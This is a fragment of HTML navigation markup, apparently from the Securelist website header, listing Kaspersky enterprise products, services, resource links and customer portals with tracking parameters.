<li class="show-figure smaller-item icon-transportation-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87720"><figure><a href="https://www.kaspersky.com/enterprise-security/transportation-cybersecurity-it-infrastructure?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/transportation-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/transportation-cybersecurity-it-infrastructure?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Transportation Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/transportation-cybersecurity-it-infrastructure?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-retail-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87721"><figure><a href="https://www.kaspersky.com/enterprise-security/retail-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/retail-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/retail-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Retail Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/retail-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
	</ul>

<li>
	<ul class="regular">
<li class="title"><h6>Other Industries</h6>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87724"><a href="https://www.kaspersky.com/enterprise-security/telecom?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Telecom Cybersecurity</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87725"><a href="https://www.kaspersky.com/enterprise-security/industries?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">View all</a>
	</ul>

</ul>

<li class="dropdown mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87726"><a href="https://www.kaspersky.com/enterprise-security/products?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Products</a>
<ul class="submenu">
<li class="first featured featured-smaller menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87728">
	<ul class="featured section-col-l-3 no-gutter">
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-112352"><a href="https://www.kaspersky.com/next?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><figure><img alt="" src="https://media.kasperskydaily.com/wp-content/uploads/sites/92/2024/04/10052437/k_Next_RGB_black_icon.png"></figure>Kaspersky Next <small class="label-inline red">NEW!</small></a><div class="desc"><p><a href="https://www.kaspersky.com/next?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-112323"><a href="https://www.kaspersky.com/enterprise-security/xdr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>XDR</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/xdr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-endpoint-security_products menu-item menu-item-type-custom menu-item-object-custom menu-item-87727"><figure><a href="https://www.kaspersky.com/enterprise-security/endpoint?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/endpoint-security_products.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/endpoint?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Endpoint Security for Business</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/endpoint?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-endpoint-detection-and-response menu-item menu-item-type-custom menu-item-object-custom menu-item-112324"><figure><a href="https://www.kaspersky.com/enterprise-security/endpoint-detection-response-edr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/endpoint-detection-and-response.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/endpoint-detection-response-edr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>EDR Expert</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/endpoint-detection-response-edr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-hybrid-cloud-security_products menu-item menu-item-type-custom menu-item-object-custom menu-item-87730"><figure><a href="https://www.kaspersky.com/enterprise-security/edr-security-software-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/hybrid-cloud-security_products.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/edr-security-software-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>EDR Optimum</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/edr-security-software-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-anti-targeted-attack-platform menu-item menu-item-type-custom menu-item-object-custom menu-item-87731"><figure><a href="https://www.kaspersky.com/enterprise-security/anti-targeted-attack-platform?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/anti-targeted-attack-platform.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/anti-targeted-attack-platform?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Anti Targeted Attack Platform</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/anti-targeted-attack-platform?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-112325"><a href="https://www.kaspersky.com/enterprise-security/cloud-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Hybrid Cloud Security</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/cloud-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-112326"><a href="https://www.kaspersky.com/enterprise-security/sd-wan?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>SD-WAN</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/sd-wan?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-private-security-network menu-item menu-item-type-custom menu-item-object-custom menu-item-87732"><figure><a href="https://www.kaspersky.com/enterprise-security/industrial-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/private-security-network.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/industrial-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Industrial CyberSecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/industrial-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-embedded-systems-security menu-item menu-item-type-custom menu-item-object-custom menu-item-87733"><figure><a href="https://www.kaspersky.com/enterprise-security/container-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/embedded-systems-security.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/container-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Container Security</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/container-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
	</ul>

<li>
	<ul class="regular">
<li class="title"><h6>Other Products</h6>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112328"><a href="https://www.kaspersky.com/enterprise-security/products/internet-gateway?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Security for Internet Gateway</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112329"><a href="https://www.kaspersky.com/enterprise-security/embedded-systems?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Embedded Systems Security</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112330"><a href="https://www.kaspersky.com/enterprise-security/kaspersky-iot-infrastructure-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky IoT Infrastructure Security</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112331"><a href="https://www.kaspersky.com/enterprise-security/kaspersky-secure-remote-workspace?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Secure Remote Workspace</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112332"><a href="https://www.kaspersky.com/enterprise-security/mail-server-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Security for Mail Server</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87740"><a target="_blank" href="https://www.kaspersky.com/enterprise-security/products?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">View All</a>
	</ul>

</ul>

<li class="dropdown mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87741"><a href="https://www.kaspersky.com/enterprise-security/services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Services</a>
<ul class="submenu">
<li class="first featured featured-smaller menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87742">
	<ul class="featured section-col-l-3 no-gutter">
<li class="show-figure smaller-item icon-cybersecurity-services menu-item menu-item-type-custom menu-item-object-custom menu-item-87743"><figure><a href="https://www.kaspersky.com/enterprise-security/cybersecurity-services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/cybersecurity-services.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/cybersecurity-services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Cybersecurity Services</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/cybersecurity-services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-105619"><a href="https://www.kaspersky.com/enterprise-security/security-awareness?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Security Awareness</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/security-awareness?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-premium-support menu-item menu-item-type-custom menu-item-object-custom menu-item-87745"><figure><a href="https://www.kaspersky.com/enterprise-security/premium-support?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/premium-support.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/premium-support?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Premium Support</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/premium-support?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-threat-intelligence menu-item menu-item-type-custom menu-item-object-custom menu-item-87746"><figure><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/threat-intelligence.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Threat Intelligence</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-incident-response menu-item menu-item-type-custom menu-item-object-custom menu-item-87748"><figure><a href="https://www.kaspersky.com/enterprise-security/managed-detection-and-response?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/incident-response.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/managed-detection-and-response?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Managed Detection and Response</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/managed-detection-and-response?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-threat-hunting menu-item menu-item-type-custom menu-item-object-custom menu-item-87747"><figure><a href="https://www.kaspersky.com/enterprise-security/compromise-assessment?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/threat-hunting.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/compromise-assessment?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>Compromise Assessment</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/compromise-assessment?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-threat-hunting menu-item menu-item-type-custom menu-item-object-custom menu-item-112333"><figure><a href="https://www.kaspersky.com/enterprise-security/soc-consulting?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/threat-hunting.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/soc-consulting?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><span class="surtitle">Kaspersky</span>SOC Consulting</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/soc-consulting?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
	</ul>

<li>
	<ul class="regular">
<li class="title"><h6>Other Services</h6>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87751"><a href="https://www.kaspersky.com/enterprise-security/professional-services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Professional Services</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87752"><a href="https://www.kaspersky.com/enterprise-security/incident-response?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Incident Response</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87753"><a href="https://www.kaspersky.com/enterprise-security/cyber-security-training?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Cybersecurity Training</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87755"><a href="https://www.kaspersky.com/enterprise-security/services?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">View All</a>
	</ul>

</ul>

<li class="dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87756"><a href="https://www.kaspersky.com/enterprise-security/resources?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Resource Center</a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87757"><a href="https://www.kaspersky.com/enterprise-security/resources/case-studies?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Case Studies</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87758"><a href="https://www.kaspersky.com/enterprise-security/resources/white-papers?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">White Papers</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87759"><a href="https://www.kaspersky.com/enterprise-security/resources/data-sheets?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Datasheets</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87760"><a href="https://www.kaspersky.com/enterprise-security/wiki-section/home?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Technologies</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105620"><a href="https://www.kaspersky.com/MITRE?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">MITRE ATT&#038;CK</a>
</ul>

<li class="dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87761"><a href="https://www.kaspersky.com/about?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">About Us</a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105621"><a href="https://www.kaspersky.com/about/transparency?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Transparency</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105622"><a href="https://www.kaspersky.com/about/press-releases?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Corporate News</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105623"><a href="https://press.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Press Center</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105624"><a href="https://www.kaspersky.com/about/careers?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Careers</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105626"><a href="https://www.kaspersky.com/about/sponsorships/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Sponsorship</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105627"><a href="https://www.kaspersky.com/about/policy-blog?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Policy Blog</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105628"><a href="https://www.kaspersky.com/about/contact?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Contacts</a>
</ul>

<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87762"><a href="https://www.kaspersky.com/gdpr?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">GDPR</a>
</ul>		</nav>
	</div>
</header>

<div class="mobile-menu-wrapper mobile-menu-wrapper--dark">
	<ul class="mobile-nav" data-back="Back">
		<li class="selector">
			<a data-element-id="subscribe-button" href="#modal-newsletter" class="button-link js-modal-open"><i class="font-icons icon-envelope"></i>Subscribe</a>
			<a href="#" class="button-link c-theme-switcher js-theme-switcher"><i class="font-icons icon-moon"></i> Dark mode<span class="u-hidden u-inline--dark"> off</span></a>
							<a data-element-id="login-button" href="#" class="button-link js-kaspersky-sso-login"><svg class="o-icon o-svg-icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-user"></use></svg>Login</a>
					</li>
		<li class="title">
			<span>Securelist menu</span>
		</li>
		<li class="parent" data-parent data-icon="top-item"><a data-element-id="lang-selector" href="#" class=""><i class="top-item"></i><span>English</span></a><ul class="submenu"><li class="menu-item"><a href="https://securelist.ru/the-zero-day-exploits-of-operation-wizardopium/97082/">Russian</a></li><li class="menu-item"><a href="https://securelist.lat">Spanish</a></li></ul>
<li class="parent" data-parent="Existing Customers" data-icon="font-icons top-item"><a rel="Existing Customers" href="#"><i class="font-icons top-item"></i><span>Existing Customers</span></a>
<ul class="submenu">
<li class="parent" data-parent="Personal" data-icon="top-item"><a rel="Personal" href="#"><i class="top-item"></i><span>Personal</span></a>
	<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87860"><a href="https://my.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">My Kaspersky</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105987"><a href="https://www.kaspersky.com/renewal-center/home?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Renew your product</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105988"><a href="https://www.kaspersky.com/downloads?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Update your product</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105989"><a href="https://support.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Customer support</a>
	</ul>

<li class="parent" data-parent="Business" data-icon="top-item"><a rel="Business" href="#"><i class="top-item"></i><span>Business</span></a>
	<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105991"><a href="https://ksos.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">KSOS portal</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105992"><a href="https://cloud.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Kaspersky Business Hub</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105993"><a href="https://support.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Technical Support</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105994"><a href="https://www.kaspersky.com/small-to-medium-business-security/resources?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Knowledge Base</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105995"><a href="https://www.kaspersky.com/renewal-center/vsb?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Renew License</a>
	</ul>

</ul>

<li class="parent" data-parent="Home" data-icon="font-icons top-item"><a rel="Home" href="#"><i class="font-icons top-item"></i><span>Home</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87778"><a href="https://www.kaspersky.com/home-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Products</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87771"><a href="https://www.kaspersky.com/downloads?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Trials&#038;Update</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87859"><a href="https://www.kaspersky.com/resource-center?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Resource Center</a>
</ul>

<li class="parent" data-parent="Business" data-icon="top-item"><a rel="Business" href="#"><i class="top-item"></i><span>Business</span></a>
<ul class="submenu">
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112353"><a href="https://www.kaspersky.com/next?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Kaspersky Next</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87776"><a href="https://www.kaspersky.com/small-business-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Small Business (1-50 employees)</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87782"><a href="https://www.kaspersky.com/small-to-medium-business-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Medium Business (51-999 employees)</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87783"><a href="https://www.kaspersky.com/enterprise-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_mobmen_sm-team_______03880766cb97f3a8">Enterprise (1000+ employees)</a>
</ul>

<li class="splitter"></li>
